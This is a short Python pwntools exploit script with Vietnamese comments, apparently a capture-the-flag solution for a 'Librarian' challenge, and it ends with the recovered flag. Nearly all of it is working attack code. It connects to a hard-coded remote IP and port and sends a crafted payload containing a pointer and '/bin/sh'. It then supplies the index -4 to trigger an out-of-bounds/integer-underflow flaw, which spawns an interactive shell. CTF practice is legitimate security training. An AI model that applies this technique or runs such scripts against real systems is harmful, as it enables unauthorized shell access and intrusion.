#!/usr/bin/env python3
from pwn import *

# Cấu hình context cho phù hợp với kiến trúc của file binary (thường là 64-bit)
context.update(arch='amd64', os='linux')

# --- Cấu hình kết nối ---
# Thay đổi HOST và PORT nếu cần
HOST = '103.197.184.48'
PORT = 13335

# Địa chỉ của biến 'lib' trong vùng .bss
# QUAN TRỌNG: Địa chỉ này có thể cần được thay đổi.
# Bạn có thể tìm nó bằng GDB với lệnh `p &lib` nếu có file binary.
# Nếu không, 0x4040c0 là một giá trị thường gặp cho các bài CTF đơn giản.
LIB_ADDR = 0x4040a0

# Bắt đầu kết nối
p = remote(HOST, PORT)

# --- Xây dựng Payload ---

# Chuỗi lệnh chúng ta muốn thực thi
command = b'/bin/sh\x00'

# Payload sẽ có cấu trúc như sau:
# [ 8 bytes: con trỏ tới chuỗi lệnh ]
# [ 8 bytes: đệm (padding) ]
# [ 8 bytes: chuỗi lệnh '/bin/sh' ]
# [ 8 bytes: đệm (padding) ]

# Địa chỉ của chuỗi lệnh sẽ nằm trong payload của chúng ta.
# Chúng ta đặt chuỗi lệnh ở offset 16 bytes trong buffer 'lib'.
command_addr = LIB_ADDR + 16

# Tạo payload
payload = b''
# 1. Con trỏ (8 bytes đầu tiên) trỏ tới vị trí của chuỗi lệnh
payload += p64(command_addr)
# 2. Đệm 8 bytes
payload += b'A' * 8
# 3. Chuỗi lệnh
payload += command
# 4. Đệm phần còn lại để đủ 32 bytes
payload += b'B' * (32 - len(payload))

log.info(f"Địa chỉ của biến 'lib' được giả định là: {hex(LIB_ADDR)}")
log.info(f"Địa chỉ của chuỗi '/bin/sh' sẽ là: {hex(command_addr)}")
log.info(f"Payload được gửi đi (dài {len(payload)} bytes): {payload}")


# --- Gửi dữ liệu để khai thác ---

# 1. Gửi payload 32-byte khi chương trình yêu cầu "Librarian's note"
p.sendafter(b'Librarian\'s note (32 bytes): ', payload)
log.success("Payload đã được gửi!")

# 2. Gửi chỉ số -4 để khai thác lỗ hổng integer underflow
# Điều này làm cho chương trình đọc 8 byte đầu tiên của payload của chúng ta làm con trỏ
p.sendlineafter(b'Choose a shelf (0-7, 9=exit): ', b'-4')
log.success("Chỉ số -4 đã được gửi để kích hoạt lỗ hổng!")

# 3. Chuyển sang chế độ tương tác để có thể sử dụng shell
log.info("Chuyển sang chế độ tương tác...")
p.interactive()

# flag: PTITCTF{aN_oUt-oF-BoUnDs_ReAd/wRiTe_iS_vErY_DaNgErOuS}